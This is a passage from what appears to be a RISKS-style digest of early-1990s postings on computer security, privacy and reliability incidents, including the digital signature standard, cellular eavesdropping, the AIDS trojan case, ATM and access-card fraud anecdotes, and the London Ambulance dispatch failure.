is that US manufacturers are less likely to develop privacy-protecting products
for the domestic market.

	As our country becomes increasingly dependent on computer
communications for all forms of business and personal communication, the need
to ensure the privacy and security of these messages that travel along the
networks grows.  Cryptography is the most important technological safeguard for
ensuring privacy and security.  We believe that the general public should be
able to make use of this technology free of government restrictions.

	There is a great opportunity today for the United States to play a
leadership role in promoting communications privacy.  We hope to begin this
process by this call for a reevaluation of our national interest in
cryptography and privacy.

Digital Signature Standard

I know that you are interested in our progress in developing a federal digital
signature standard based upon the principles of public-key cryptography.  I am
pleased to tell you that we are working out the final arrangements on the
planned standard, and hope to announce later this summer our selection of a
digital signature standard based on a variant of the ElGamal signature
technique.

Our efforts in this area have been slow, difficult, and complex.  We evaluated
a number of alternative digital signature techniques, and considered a variety
of factors in this review: the level of security provided, the ease of
implementation in both hardware and software, the ease of export from the U.S.,
the applicatility of patents and the level of efficiency in both the signature
and verification functions that the technique performs.

In selecting digital signature technique method [sic], we followed the mandate
contained in section 2 of the Computer Security Act of 1987 to develop
standards and guidelines that ". . . assure the cost-effective security and
privacy of sensisive information in Federal systems."  We placed primary
emphasis on selecting the technology that best assures the appropriate security
of Federal information.  We were also concerned with selecting the technique
with the most desirable operating and use characteristics.

In terms of operating characteristics, the digital signature technique provides
for a less computational-intensive signing function than verification function.
This matches up well with anticipated Federal uses of the standard.  The
signing function is expected to be performed in a relatively computationally
modest environment such as with smart cards.  The verification process,
however, is expected to be implemented in a computationally rich environmnet
such as on mainframe systems or super-minicomputers.

With respect to use characteristics, the digital signature technique is
expected to be available on a royalty-free basis in the public interest
world-wide.  This should result in broader use by both government and the
private sector, and bring economic benefits to both sectors.

A few details related to the selection of this technique remain to be worked
out.  The government is applying to the U.S. Patent Office for a patent, and
will also seek foreign protection as appropriate.  As I stated, we intend to
make the technique available world-wide on a royalty-free basis in the public
interest.

A hashing function has not been specified by NIST for use with the digital
signature standard.  NIST has been reviewing various candidate hashing
functions; however, we are not satisfied with any of the functions we have
studied thus far.  We will provide a hashing function that is complementary to
the standard.

I want to speak to two issues that have been raised in the public debate over
digital signature techniques.  One is the allegation that a "trap door", a
method for the surreptitious defeat of the security of this system, has been
built into the technique that we are selecting.  I state categorically that no
trap door has been designed into this standard nor does the U.S. Government
know of any which is inherent in the ElGamal signature method that is the
foundation of our technique.

Another issue raised is the lack of public key exchange capabilities.  I
believe that, to avoid capricious activity, Public Key Exchange under control
of a certifying authority is required for government applications.  The details
of such a process will be developed for government/industry use.

NIST/NSA Technical Working Group

Aspects of digital signature standard were discussed by the NIST/NSA Technical
Working Group, established under the NIST/NSA Memorandum of Understanding. The
Working Group also discussed issues involving the applicability of the digital
signature algorithm to the classified community, cryptographic key management
techniques, and the hashing function to be used in conjunction with the digital
signature standard.  Progress on these items has taken place; however, as with
the digital signature standard, non-technical issues such as patents and
exportability require examination, and this can be a lengthy process.  We have
found that working with NSA is productive.  The Technical Working Group
provides an essential mechanism by which NIST and NSA can conduct the technical
discussions and exchange contemplated by the Computer Security Act and also
allows us to address important issues drawing upon NSA's expertise.

&gt;There's been a lot of discussion of the safety of fly-by-wire aircraft, so
&gt;here's the discussion of an accident that very possibly would have been
&gt;prevented were the DC-10 fly-by-wire rather than hydraulic.

As I'm sure Mary realizes, FBW does not alleviate the necessity for multiple-
redundant hydraulics, and all the plumbing that comes with them.  As currently
implemented on most aircraft, it simply replaces the means by which the
*hydraulic* actuators are operated.  Instead of cables, there are electrical
wires.  These leads to one or more computers, which in turn process command
inputs from the pilot, leading to the possibility of unconventional control
laws.  Most of the controversy of FBW occurs at this stage.  The severity of
the failure involved would have happened whether the DC-10 were FBW or not.

Now, in rebuttal, I'm sure Mary'd point out that the FBW issue would only
enter in the form of *control* issues subsequent to the accident, introducing
unconventional control laws to effectively duplicate (or improve upon) the 
differential thrust technique Haynes used.  And she has a point.  But there's 
always the question of whether the complexity and cost of such software will 
ever justify its usefulness in the "1:1e-9" catastrophic control failure
case.  In safety management, there is a point of negative return.  

Perhaps a more salient observation would have been: this accident would not
have happened if there was full manual reversion on the DC-10, ala the Boeing
707? :-)

Associated Press writer Joseph Neff reports from Newark, NJ on 18 Dec 91 that
eighteen private investigators and Social Security Administration employees in
nine states were charged Wednesday with buying and selling confidential data
from SSA and FBI computers. The information included earnings histories and
criminal records. The private investigators, many advertising in legal
journals, sold the information to companies.  If convicted on all counts, the
defendants face maximum sentences of 20 to 150 years and multimillion dollar
fines.

Taurus poised to clear final hurdles

By Richard Walters in London

The UK government appeared yesterday to have overcome legal obstacles to the
introduction of Taurus, the London Stock exchange's much delayed computer
settlement system.  After more of a year of effort by the Department of Trade
and Industry lawyers, formal regulations were laid before parliament which
would create the legal framework necessary for Taurus.  At the same time a
safeguard for personal shareholders, which had been built into the Taurus
system at the request of ministers has been dropped.

Investors would have had to quote confidential 13-digit personal authorisation
codes before being able to deal in their shares.  This requirement has now been
judged too cumbersome for the small amount of extra security it would have
bought.  Instead shareholders will be able to tell the registrars who maintain
their shareholders only to transfer their shares after they receive written
instructions.  This extra level of security will be available only to investors
who specifically request it.

The legal changes tabled yesterday are needed because share certificates and
transfer forms, currently required by law to give evidence of title and enable
a change of title to take place, will cease to be produced under the new,
paperless system of share ownership and dealing.  ...

An unverified report indicates that a German private detective agency that was
thought to be operated by former Stasi members bought a computer database
containing the names and salaries of 97,058 members of the Stasi in 1989.  The
detective agency then pressed charges against the computer specialist who sold
them the information.  The charges are not indicated, although they may be
under the strict (West) German privacy laws.  If so, Stasi support for privacy
is new.  In addition to their prying into the lives of (East) German citizens,
the Stasi had agents actively hacking into West German systems, including
Berlin's drivers license agency.

The following "news" message greeted us today (Dec. 21, 1991) here at UC
Berkeley.  It is curious that the message is dated two days into the future...

                        U N I X   N E W S 
                Items ordered most current first.

23 Dec 91 &gt;&gt; Important Information about Computer Systems Court Order &lt;&lt;

We were recently required by order of the Alameda County Superior Court to
search files on Garnet and Violet that may contain a particular individual's
name within the file.  We are complying with that court order.

We think it is important to alert you that files on the shared systems, or even
on personal workstations or microcomputers, are subject to search, and even
seizure, by court order.

Perhaps I should explain the subject line... Mercury offer an alternative
long-distance telephone network which is available to ordinary users who have
the standard British Telecom connections, and which offers improved itemized
billing, lower costs, etc. etc. This is implemented by issuing Mercury users
with a long personal identification number which represents their account, and
which is known only by the user (very much like bank card PIN's, only much
longer). Mercury calls are made from standard British Telecom phones by dialing
a special prefix followed by the secret Mercury PIN and then the "real" phone
number.

See the problem yet? I can't send TelePort faxes this way because the
*destination* fax number is printed on the cover page. This includes my Mercury
PIN which would be compromised by any fax I sent using it. This is a serious
drawback.

Possible solutions: (i) suppression of printout of destination fax number on
cover sheet (yes, I could use an empty cover sheet, but I want to send faxes
from applications like text editors which don't let me paste graphics). Better
option: (ii) provision in the TelePort/Fax software for a "secret prefix" which
is dialed for all numbers but not reported on the cover sheet, or a pair of
numbers ("reported" and "dialed") for each fax address. (It's possible I'm
missing something here in the way long distance codes are specified in the
address book - in this case each long distance code would be around 20 digits -
might this do what I want?)

Is there no system in the US that works in a similar way to Mercury? Just
curious whether anyone in the US is going to come across the same problem.

        Nick.

The Boston Globe (December 30, 1991) reported that a disgruntled Honda owner
called its "Better Business Bureau Information Line" toll-free customer
relations number so many times that he clogged the line.  He did the same to
other 800 numbers used primarily by Honda employees and dealers.  In both cases,
he presumably used an automatic redialing mechanism (daemon dialer).  He then
began tying up a Honda facsimile number by transmitting muti-page letters during
a four-day period.

American Honda Motor Co. says that it was forced to ask AT&amp;T to step in and
block the calls which allegedly came from a Holliston, Mass home.  However, AT&amp;T
security said that it also had to block any calls to the Honda numbers for the
entire 508 area code, which covers west and north of Boston.  Attempts to reach
the Holliston complainer was not possible since his phone is unlisted!   

I seem to remember that a televangelist's number was tied up in a similar
fashion a few years ago and there has been rumours of political candidates'
phones being plugged by their competition.  How common is this form of
destructive behavior?  

It will be interesting to see whether AT&amp;T does some form of call or line
blocking on this individual.  How can phones be made open except for certain
parties who overstep bounds?  When are there too many calls and when is the line
crossed into harassment?  Is this a case where caller ID would have "proven" 
harassment?  Under what conditions is someone no longer allowed "phone rights?"
Was the Los Angeles judge's denial of telephone use by Ian Mitnick to prevent
him from connecting to a computer in any way related in a legal sense to this
present incident?  

Good story to end 1991.  The year of ousted regimes, stalled economies, and
phone disorders.  Sort of an updated version of Sex, Lies, and Videotapes, 
to be called Lex, Slides, and Telegaps.

The Washington Post, 5 Jan 1992, page C6 (the editorial page):

  As technologies become more powerful, the distinction between a helping tool
and a decision-making tool keeps gaining importance.  Nowhere is this clearer
than in the case of the new diagnosis-aiding computers, which offer doctors the
benefit of a gigantic data base -- far larger than their own experience could
be -- compiled from the results of many thousands of cases nationwide.  By
conglomerating and analyzing the results of these cases, the computer can read
out a series of alternative treatments, a probability rating on the success of
a given procedure or -- most controversially -- the statistical risk of a
patient's dying upon arrival in an intensive care unit in a given condition.
Physicians with access to such a machine now bear a responsibility at least as
weighty as that of diagnosis itself: that of balancing the computer's seemingly
precise numbers and instant certainties with the knowledge that its results are
dependent upon human judgement.

  According to the staff in a Michigan hospital using a program of this type
called APACHE, the computer's predictions of a patient's statistical
probability of dying -- calculated to two decimal points -- are used strictly
as tools, rather as any doctor might estimate, say, a 10 percent chance of
survival from a given operation.  A better description of risk, in that
scenario, need not govern the doctor's (or the family's) decision as to whether
the risk should be taken, only inform it better than individual experience ever
can.  But the incomplete results of a different study performed in France
suggested that doctors with access to that kind of risk data were more likely
than others to terminate care.  The fear among practitioners is that hospital
administrators or health bureaucrats, all increasingly beleaguered and pushed
by public pressure toward cost-cutting, might see computer-confirmed statistics
on death risk as a road to easier triage.

  Given the capability for vastly enhanced diagnosis by means of computers, the
medical profession will be stuck with the same responsibility -- also vastly
enhanced -- as before: first, to recognize that a computer can serve the cause
of accurate diagnosis only on the basis of properly entered information by the
physician using his or her senses; second, to keep in mind a fact much of the
general public has trouble with, which is that a statistic about the
probability of an event bears no causal relationship to that event.  A person
with a 95 percent chance of dying under a procedure is not the same thing as a
person whom that procedure cannot help, or a person from whom care can be
withheld with no compunctions.  Obscure that distinction, and you take a step
toward making the computer the master -- a bad one.
                                                               - Mike

Subject: AIDS Computer Virus

Remember that "AIDS Computer Virus" that was distributed about two years ago?
The following article appeared in Information Week on December 16, 1991 on page

"PC VIRUS  BLACKMAIL

"A bizarre British court case involving computer viruses has pointed up the
vulnerability of users with careless policies on PC software.

"Hearing the case of a U.S. scientist accused of computer blackmail late last
month, the court granted a stay after lawyers successfully argued that the
defendant, Joseph Popp, 41, was mentally ill.  Popp was facing 11 charges of
damaging computer systems and attempting to obtain a total of 6 million pounds
($10.7 million) through blackmailing numerous medical institutes worldwide
around Christmas 1989.

"Popp is alleged to have mailed more than 20,000 floppy disks to the research
institutes.  He promoted the disks as containing valuable information about
AIDS.  But the disks themselves contained a software virus, which has since
also been dubbed AIDS.  When users tried to access the disk, they got messages
demanding 200 pounds  (about $350)  to eradicate the virus that had just
infected their systems.

"Popp was extradited to the United Kingdom, where a chorus of scientists from
universities and research institutes claimed that their software had been
damaged when the disks were loaded onto their systems.

"One organization that fell foul of the virus was the Imperial Cancer Research
Fund in London.  Dr. Ron Catterall, director of the fund's computer research
unit, was called as a witness for the prosecution.  Catterall was smart: He
loaded the disk onto his standalone PC rather than the network, and warned
other users as he discovered the virus.  `It took a long time to find out what
was going on, and to clean up my machine,' he said.  `It eventually started
overwriting the hard disk.'
                                           Philip Hunter."

The FAA has an on line pilot briefing sysem called DUAT (Direct User Access
Terminal).  The version of the service I use is provided by Contel Federal
Systems.  For those who are not familiar with aviation weather the raw data is
supplied in a very cryptic form.  To make simplify things for users DUAT has a
decoder that expands this into `english'.

However last night the FT (Terminal Forecast - a 24 hour forward forecast) for
both San Jose (SJC) and San Francisco (SFO) was showing 3 VBSY which was being
decoded as:
                Visibility 3 in snow and blowing spray 

There seem to be two possible causes:

1) a decode error (I don't know what the correct decode of VBSY is)
2) VBSY does mean snow and spray and the NWS screwed up the forecast.

Either way computer weather briefing has a way to go yet.

John Pettitt, Specialix International     (jpp%slxinc@uunet.uu.net)

    [In response to my comment that Mt Hamilton is east of San Jose and
    Mt Diablo east of Oakland, and they do get snow now and then, John noted 
    that the terminal forecast is for conditions on the airport and within 
    the Airport Traffic Area (ATA), which is 5 miles radius.  &lt;"Anyway, I 
    called the DUAT help desk and they thought the idea of snow was rather 
    a good joke - `another bug for the list'."  (John)&gt;  PGN]

I recently asked at my post office how many houses shared the same ZIP+4 code
with my house.  The answer was that if I lived in a single-family dwelling, I
almost certainly have a unique ZIP+4 code.

I note that the USPS now provides a complete database of ZIP+4 addresses in the
country -- it is on CDROM, and it is included in the postal exhibit in
Chicago's Museum of Science and Industry, where you can type in your address
(as you would on a letter), and it gives you your ZIP+4 in response.  I tried
it on my address here in Iowa, and it worked correctly.

The risk I see in this is that statistical data that has traditionally been
available sorted by ZIPcode (for example, census data) may be released broken
down by ZIP+4 codes.  If this is done, it destroys any promise of
confidentiality for such data.

Of course, there is a benefit -- you should be able to send mail to me with
only a ZIP+4; no need to mention city, state, street, or house number.

They handed the cards out in alphabetical order to staff, and the barcodes/card
numbers were congruent and the batch was sorted. Skilled person (not self)
examined 3 in sequence, calculated trivial encryption and checksum algorithm
used, inferred card for senior member of staff, used Public Domain code to
generate barcode strip on apple laserwriter, glued to card and swiped through
lock. bingo! instant access to secured areas, leaving calling card of selfsame
high-up all over the online logs.

Infra-Red readers also handle normal light codes. Good eyes can read thick/thin
sequences in strong light so even if numeric code on card doesn't match bars,
its forgeable. Infra-Red also pretty trivial to obtain as it UV reader.

I really think the local admin/security people have been blinded by science.
Apart from anything else the electromagnets which operate the doorlocks look
very subvertable. Another instance of hindering the novice and legitimate,
whilst barely impeding anybody intent on skullduggery.

background heat, some emitted vapour from the car interior, or all three has
made it do a disappearing fax trick in reverse. Illegible unless scrutinized

I hope nobody's using one of these to do "permanent" chart recording or
whatever in hot locations...

This afternoon, a colleague at SLAC (the Stanford Linear Accelerator Center)
was showing me the latest screen lock and saver program he had obtained for his
workstation, a port of the one often found on Suns.  This reminded me of an
incident several years ago when I was visiting my friend George Berg.

George is a professor of computer science at SUNY Albany, known in the
department for his AI programs that run for days or even weeks at a time on
several SPARCstations, grabbing every available CPU cycle.  Over the weekend,
George dialed in from home to check on the progress of his latest project and
was a bit surprised to find that it seemed to be running much more slowly than
it had during the week.  When a later checkup again showed minimal progress he
began to invistigate, and found that the machine was indeed busy -- running
Life on the unused screen in his office!  After disabling the screen saver the
real work continued on without further competition.

Getting back to SLAC today, this is quite relevent as some of our computing
tasks involve many essentially unrelated events, work that can easily be farmed
out to machines on the network with cycles to spare.  Obviously productive use
of our resources depends on users understanding that "their" machine isn't
necessarily free to simulate life, compute pi to a million decimal places, or
enumerate the nine billion names of God just because they aren't in the office.
It's also easy to forget just how many resources some "cute" program can use.

I have recently been reading Richard Hamming's book "The Art of Probability,"
(Addison Wesley, 1991) and wish to strongly commend it to those of you who
haven't yet seen it. Please allow me to whet your appetite with the following
brief excerpts.

"This book...is one man's opinion using a rather more scientific (as opposed
to mathematical) approach  to  probability than is usual." 

"Most  authors of probability books present one version of probability as if
it  were the true and only one. On the contrary, we have carefully developed
a sequence of models on what seems to be a reasonably scientific approach."

"The  model  of  probability you adopt is often relevant to what actions you
later  take,  though  most statistics books do not make plain and clear just
what  is  being assumed. Unfortunately, many times the statistical decisions
affect  our  lives, from health, medicine, pollution, etc. to reliability of
power plants, safety belts vs. air bags, space flights, etc."

"The  weak  law of large numbers encourages one to think that the average of
many repetitions will give an estimate of the underlying probability. But we
have seen...that the number of trials necessary to give an accurate estimate
of  the probability may be much more than we can ever hope to carry out. And
there  are  further  difficulties.  We  assumed  the  existence of the mean;
suppose  it  does  not exist! (see the next Section 8.7). It is not that the
author  is  opposed  to  statistics--there is often nothing else to try in a
given  situation--but  the  stated reliabilities that statisticians announce
are  often  not  realized  in  practice.  Unfortunately,  the foundations of
statistics,  and  its applicability in many of the situations in which it is
used, leaves much to be desired, especially as statistics will probably play
an increasingly important role in our society."

I recently received a copy of "A Pathology of Computer Viruses" by
David Ferbrache of the UK Defense Research Agency.  The book is
copyrighted 1992, and is published by Springer-Verlag (ISBN
3-540-19610-2 and 0-387-19610-2).  US price was $39.50. 300 pages.

This book is an extraordinarily comprehensive book on the history, theory, and
operation of computer viruses, and on virus countermeasures.  It is the most
complete book I have seen on the topic to date, and contains a very detailed
description of how PC viruses work and spread, including viruses in networked
environments, viruses in Amiga systems, and viruses in Unix.  In fact, I expect
David to get some criticism for the detail he presents, but it serves to make
the subject matter much clearer.

Chapter 1 is a general introduction to the topic of viruses, worms, and
malware.  Chapter 2 is devoted to the history of viruses and "malware" starting
from the 1960s and thru the end of 1990.  It has a very complete description of
the earliest viruses, including some events and activities that have not been
generally reported elsewhere.  It also includes interesting information on
related activities, such as the founding of the Virus-L mailing list.

Chapter 3 is a nice introduction to the theory of computer viruses, including
discussion of how computer viruses relate to biological viruses, and other
related topics such as artificial life.

Chapter 4 is a detailed discussion of how viruses operate in an IBM PC
environment.  This includes details on camouflage techniques and signatures as
well as spread and activation.  Chapter 5 provides extensive discussion of
techniques to protect against computer viruses.  Chapter 6 is a description of
how viruses work in the Apple Macintosh.  Chapter 7 discusses viruses in
mainframes and Unix systems.

Chapter 8 is devoted to "network viruses" -- worms.  This includes analysis of
early work, the Morris Worm, WANK, Christma Exec, and even a discussion of
e-mail chain letters!  The chapter also has a nice discussion of Internet
protocols that lend themselves to abuse by malicious code.

Chapter 9 is a chapter discussing reactions of the computing community,
including some legislative history and information on the formation of response
teams.  Chapter 10 is a brief statement about the future of the problem.

The book concludes with 18 appendices, listing everything from the DOS
filestore structure to a PC virus family tree to all the CERT advisories to
date.  One of the appendices provides an extensive reading list.


Overall, the book is one of the best books on computer viruses I've seen.
David's illustrations are clear and his prose is quite readable.  I found
information and details in this book that I have not seen in any other virus
book.  The section on the history of computer viruses, in particular, is quite
well done.

There are some small problems with the book, however.  First of all, I was very
disappointed that there were almost no footnotes or citations in the body of
the book.  As I read through the material I noted material that I wished to
pursue further -- unfortunately, there were no citations to allow me to seek
original sources.  I do not doubt the accuracy of the information presented,
but I feel that the lack of specific citations is a flaw in such a scholarly
work.

The book suffered from spotty copy-editing.  I found many places where there
were quite obvious typos.  In a few places, these typos obscured the text's
meaning or distorted some information.  I am not sure whether to fault the
author or the publisher, but is is sad to see in an otherwise excellent book by
an established publisher.

Another minor complaint is that there is no presentation of formal theory about
viruses or worms.  Although this is not an area that has seen much good work,
it would have been useful to have some coverage of that material here to
complement the higher-level descriptions.

The appendix listing other references was good, and contained some references I
have not seen before, but it did not give any indication which of the many
references were particularly noteworthy or why the references were cited.  For
instance, a number of limited-availability BBS postings and Usenet articles
were cited without an indication of why they were included.  At the same time,
the references did not list either of the fine collections of readings by
Professor Peter Denning ("Computers Under Attack" ACM Press/Addison Wesley) and
Professor Lance Hoffman ("Rogue Programs" Van Nostrand Reinhold), nor did it
reference any of the publications by the NCSA.

The book is written primarily for a British audience.  This means that the
coverage of US-specific items, such as anti-virus legislation, is briefer than
a US reader might prefer.  It also means that some small translation of terms
is necessary in spots; of course, this same criticism can be made of many
US-centric books being published in a non-US market.

Despite these criticisms, I strongly recommend this book to anyone who is
interested in computer viruses and security.  It presents material clearly and
comprehensively, and provides unbiased coverage of the area (David is not
involved with the marketing of anti-virus software or seminars as are many
other virus book authors).

Fueling is performed by an external source, not by the plane (at least for all
the American made planes that I have worked with, e.g. MD-80's, 727's, etc..)
The plane has a control panel which works on conjunction with the fueling system
from the tanker to indicate how much fuel the plane should take (i.e. how much
do you want to put in) and then automatically cuts off the flow when either the
limit of storage or the limit of input has been reached.  There are internal
pumps to move the fuel around from tank to tank.

It sounds like the fueling panel on the plane was not working correctly and they
needed to manually determine the amount to input.  This is typically done my
either disabling the fueling panel (or overriding the auto-cutoff) and
determining the fueling progress from inside the cockpit.  One problem with this
technique is that it requires multiple people (one in the cockpit, one at the
pumping station, and maybe others from the airline to supervise the
override/disable of the fueling panel).

This practice is quite common w/ older American jets and only occasionally
causes problems, e.g. when fuel spills due to other malfunctions.

Many people regard greasy marks on monitor screens a nuisance.  If there is any
danger, it is the donor who is at risk because s/he many get some verbal or
perhaps (tongue in cheek?) physical abuse from subsequent users.  Not so.

This weekend, I cleaned the monitor of a workstation I was using in our lab.
Heeding warnings about getting electric shocks from static build ups, I turned
the monitor off for a minute before applying the anti-static cleaner.  When I
began to wipe off the water-based cleaner with a paper towel, the screen burst
into flames.  Blue-yellow flames may look nice with a beige plastic `dimple
effect' surround, but they are not good for the skin.

Apparently, so I am told, CFCs have been replaced in these aerosols by
flammable propellants.  The risks are clear: the housekeeping maintenance of a
computer is not without its dangers.  If the lab had a lower ceiling, and I was
not able to blow the fire out, this story might have been a different one.

  [The following was distributed here at work by our security folks. I was
  surprised at the degree to which cellular traffic has apparently become
  public speech.  But then, perhaps my surprise is just a reflection of my
  naivete.  I'm not sure how Canada's laws compare to ours, but given how
  difficult it must be to catch someone at this, I can't imagine things are
  much different here in the 'States.  (But then if it's so difficult, how'd
  they do the study???)  Dave]

Two Bell Canada security managers shared some startling data with us recently.
In a three-month study of the Metro Toronto area earlier this summer, Bell
found that 80 percent of all cellular telephone traffic is monitored by third
parties.  Even more eye-opening is the fact that 60 percent of monitored calls
are taped for closer scrutiny and culling of marketable information.  The
chance of being monitored and taped is even higher in rural areas, where air
traffic is lighter. Scanners cost as little as $200, and are sold in virtually
every shopping mall in Toronto.

Marketable information includes the obvious -- mergers, take-overs, market and
product plans, but the listeners are also looking for voice/phonemail access
codes and passwords.

The digitized tones are translated into numbers quite easily. "Phone phreaks",
the telecommunications equivalent of computer hackers, use these numbers to
break into voicemail systems. One misuse which is growing in frequency is the
setting up of "pirate" voicemail boxes, often by organized crime.  Pirated
boxes give them the ability to disseminate information on drug deals, as one
example, with little or no risk of detection.

We ask you to be extremely cautious when using your personal or business
cellular phone.  Do not discuss confidential business matters, and avoid
calling in for phonemail messages via your cellular phone.

An article by John Flinn on the front page of the San Francisco Examiner,
Sunday, 1 November 1992, listed several cases of inadvertent or advertent 
eavesdropping, in the midst of a fine story on the problems in general.

 * A supposedly private conference call among SF Mayor Jordan, real-estate 
   magnate Walter Shorenstein, and several others discussing the then not 
   public withdrawal of George Shinn from the effort to save the SF Giants
   was BROADCAST on a TV frequency.

 * "On the first day of the Soviet coup against Mikhail Gorbachev last year,
   a scanner buff overheard Vice President Dan Quayle making a call from Air
   Force Two to Sen. John Danforth about the unfolding crisis."

 * "In New Hampshire, an anti-nuclear activist picked up calls made from the
   control room at the Seabrook nuclear plant, including one real-life Homer
   Simpson saying, ``I've got a bad feeling about these valves.'' "

 * A Green Bay Packer football player was overheard calling a male escort 
   service and making explicit requests.
 
 * A 23-minute conversation allegedly between Princess Diana and a man
   who called her ``my darling Squidge'' was taped by a retired bank
   manager in Oxford, and transcribed in The Sun.  (The woman allegedly
   referred to the Royal Family as ``this ****ing family''.) 

After discussing privacy laws, legalities, and realities, Flinn notes that at
Scanners Unlimited in San Carlos, CA, "about a quarter of the customers are
interested in telephone eavesdropping."

Police Officials Cited for Searching Private Computer Records

	LOS ANGELES (AP, 30 Oct 1992) -- More than 45 police officials have
been cited since 1989 for using department computers to check the backgrounds
of baby sitters, house sitters and others for personal reasons, records show.
"It's a very serious problem," Police Commissioner Ann Reiss Lane said.  The
citations came to light after a civilian Police Commission investigator was
suspended 10 days for using department computers without permission to get
confidential data on white supremacist Tom Metzger and actor Arnold
Schwarzenegger.
	The union representing Robert Bauman appealed the suspension and
submitted records showing that more than 45 department employees had been
disciplined in the last three years for illegal computer use.  Most received
suspensions of two or three days or verbal reprimands.  As an example, Lane
said Thursday, an officer might use the computer to check the background of an
individual about to marry one of the officer's relatives.
	Bauman's 10-day suspension without pay was upheld last week by the
Civil Service Commission.  Bauman, a 23-year civilian employee, said he already
has served the suspension and was back at work.  Bauman, a permit processor,
routinely uses police computers to check the criminal records, police files,
and tax records of people applying for police permits for massage parlors, gun
stores and pawn shops.  He said he gathered information on Metzger because he
is a part-time historian who does research on right- and left-wing political
groups.  Bauman said he tapped into Schwarzenegger's files because a co-worker
was curious about the actor.

Other than the obvious RISK, I'd like to point out that much or all of the data
in question here is likely kept by government mandate.

On a personal note, I recently recommended to a fellow employee that she report
a third employee to her supervisor for a similar thing.  #3 had offered to
access credit data on someone that #2 was having personal and legal trouble
with.  What appalled me what that neither one thought there was anything wrong
with "using the system" in this way -- until I explained it in terms of *their*
credit being revealed.  &lt;sigh&gt;

Several Dutch newspapers recently carried the following story:

The Dutch bank Rabobank has discovered a fraudulent use of their cash
dispensers (The term ATM is not commonly used around here. A cash dispenser
does just that - dispense cash from your bank account).  After you have
supplied your card, PIN, etc, banknotes for the desired amount will appear
between the "jaws" of the machine. The notes are held rather firmly, and the
jaws have a detection device to sense when the money has been removed.  If you
do not take your money within a given time, the machine will swallow it back,
and undo the transaction on your account.  The trick is that it appears to be
possible to remove part of the stack of notes without the machine noticing. AND
THE MACHINE DOES NOT COUNT THE MONEY IT TAKES BACK.

Here is a positive story on the RISKS theme.  I have summarized from the page
1A article of the 31-Oct-92 (Mpls, MN) Star Tribune entitled:

After computer note from France, a life is saved

Chris Ginther, a student and computer sales clerk, logged into his home
computer Wednesday evening to read his email.  One message was from "Emily", a
pen-pal of his for several years in Bordeaux, France.  The message said she
felt cold, alone and empty, that her life was futile.  The message said
goodbye, and that she was going to kill herself in a few hours.

Across a network he contacted her -- she answered.  He got her phone number and
called her.  Her weak, quiet voice said she wanted to die; that she had taken
half a bottle of sleeping pills; that she was alone.

Ginther and an AT&amp;T operator were eventually able to explain the situation to
French authorities.  An ambulance soon arrived at her house, they smashed the
door down, and found her barely breathing.  "If we came one minute later," a
paramedic said, "she would have been dead."

Ginther has since received messages from Emily as well as her family for his
heroic role.  Emily regrets her foolish act, and is feeling better about her
life now.  Fortunately, Ginther doesn't wait until morning to read his email.

Padgett Peterson was telling me about his recent success in getting a BBS set
up with one of the new modems with a "caller-id" feature.  I think this is
going to be a feature that a lot of sysops are going to want.

It happened that just last week I had a request to look into a security problem
for a local sysop.  He is concerned with security and misuse of his board, and
so he has installed a call-back-verify system to check out callers.  If he
can't call back and get a confirmed phone number, they don't get an account.
Many sysops use this to avoid having to "voice verify" each and every caller.

Most call back verify systems have an option that will prevent the system from
returning long distance calls.  Obviously, this will also apply to "900"
pay-per-call numbers.  Padgett reminds me that recently there was a scam in New
York wherein pager wearers were "paged" by "576" pay-per-minute calls.

The problem in Vancouver is that BC Tel has recently started up pay-per-call
numbers, but they do not yet have identifiable prefixes.  Therefore, ankies
have been calling various BBSes that have call-back-verify, and leaving these
pay-per-call numbers.  The sysop who talked to me had lost about $50 in the
last month, and this has only just started.

Despite all the other news, this story is still getting extensive coverage here
in the UK. The Independent's follow-up today (30 Oct.) to yesterday's front
page story appears as the main story on page 2. It identifies - for the first
time as far as I am concerned - the software company involved (Systems
Operations - a company I have not heard of before) and adds quite a bit of
detail and commentary to the original story, so again I thought it appropriate
to submit the complete item (without permission) to RISKS.

           SOFTWARE FAILURE "MAY BE BEHIND AMBULANCE CRISIS"
                   By Susan Watts and Ian McKinnon

Computer specialists yesterday said that the system blamed for this week's
crisis at the London Ambulance Service appeared to ignore basic tenets for
software where breakdown would put lives at risk.  The failure of the computer
system over 36 hours on Monday and Tuesday, which was said to have cost between
10 and 20 lives, raised serious questions about the way it was designed and
tested, experts said.  Yesterday, the software company involved, Systems
Options, refused to comment.

Leaders of London's ambulance staff last night revealed they had given the
services's new chief executive three days to review the efficiency of the
computer system.  Organisers of the public employees' union, Nupe, said they
would have preferred the Computer Aided Dispatch system to have been shut down
because it was a danger to the lives of patients.

But Chris Humphreys, the union's London regional organiser, said they had
chosen to allow a short period of grace to Mark Gorham, the acting chief
executive who replaced John Wilby after his resignation in the wake of an
outcry over delays of up to 11 hours in the arrival of emergency vehicles.
However, Mr. Hunphreys refused to disclose what action the union planned to
take if the management refused to meet its demands or arrive at a satisfactory
compromise.  He emphasised that by reverting to the system in use prior to full
computerisation on Monday and Tuesday, patients' lives were still at risk.
Ambulance staff argue that the system of partial computerisation, used in
conjunction with radio and telephone to send ambulances to emergency calls, had
already led to 45 deaths in the capital because of delays.

However, Mr. Gorham yesterday held out an olive branch when he met union
leaders by promising to conduct a full investigation into the 20 deaths
ambulance staff said were the result of delays and breakdown earlier in the
week.

Robin Bloomfield, a consultant who advised the Government on a programme to
promote the safety of computer-controlled systems, said it was a fundamental
requirement for this kind of system to have several layers of defence against
fialure.  He said the ambulance service was asking a lot of its computer
system.  "With about a million calls a year the system has to be more reliable
than a nuclear reactor protection system.  I would expect to see a detailed
safety case for justifying its operation, and several different back-up
systems".  He said that as the system originally went into operation, the only
back-up it appeared to have was the expectation that people would make their
own arrangements if the system failed.

"Safety critical" software should always be passed to an independent assessor
to make sure it does what it is supposed to, and passes safety checks.  This is
standard practice as part of the "safety culture" of companies in the nuclear
and transport industries which often use software on which people's lives
depend.  Such software should have at least one back-up system which could be
manual, electronic or even an administrative procedure, ready to switch into
operation should something go wrong.  Mr. Bloomfield said. "You would very
rarely rely on a single system."

Extra calls on Monday exacerbated the situation, but the computer system
should have been designed to cope with this.  Tom Anderson, a director of
the Centre for Software Reliability in Newcastle upon Tyne, said: "If you
are getting overload the system should go into a fall-back mode".   [...]

More than a quarter of accident and emergency ambulances from the London
Ambulance Service are failing to meet performance standards in the Patient's
Charter, Tom Sackville, Under-Secretary of State at the Department of Health,
said in a written Commons answer yesterday.

The Charter sets a 14-minute response time as the standard for London.  Latest
statistics, for 1990-91, show 26.3 per cent falling below it, even though in 11
per cent of cases ambulances were able to respond in just seven minutes.

